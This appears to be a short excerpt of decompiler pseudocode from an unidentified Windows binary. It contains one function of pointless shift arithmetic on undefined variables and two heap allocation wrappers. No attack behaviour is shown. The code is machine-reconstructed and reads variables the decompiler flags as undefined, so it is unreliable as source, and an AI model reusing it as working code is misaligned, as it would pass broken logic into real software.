// 4026C7: variable 'v5' is possibly undefined
// 404170: using guessed type int dword_404170;
// 404194: using guessed type int dword_404194;
// 40419C: using guessed type int dword_40419C;

//----- (00402720) --------------------------------------------------------
int __cdecl sub_402720(int a1)
{
  int result; // eax
  int v2; // [esp+Ch] [ebp-Ch]
  char v3; // [esp+10h] [ebp-8h]

  dword_404190 = 38391 << dword_404170;
  result = *(_DWORD *)(dword_40419C + 48);
  *(_DWORD *)(result + 8) = a1;
  dword_404170 = v2 >> (dword_404194 + dword_4041A4) << v3;
  return result;
}
// 40277F: variable 'v2' is possibly undefined
// 402786: variable 'v3' is possibly undefined
// 404168: using guessed type int dword_404168;
// 404170: using guessed type int dword_404170;
// 404190: using guessed type int dword_404190;
// 404194: using guessed type int dword_404194;
// 40419C: using guessed type int dword_40419C;
// 4041A4: using guessed type int dword_4041A4;

//----- (00402790) --------------------------------------------------------
BOOL __cdecl sub_402790(LPVOID lpMem)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapFree(v1, 0, lpMem);
}

//----- (004027D0) --------------------------------------------------------
LPVOID __cdecl sub_4027D0(SIZE_T dwBytes)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapAlloc(v1, 0, dwBytes);
}

// nfuncs=11 queued=11 decompiled=11 lumina nreq=0 worse=0 better=0
// ALL OK, 11 function(s) have been successfully decompiled
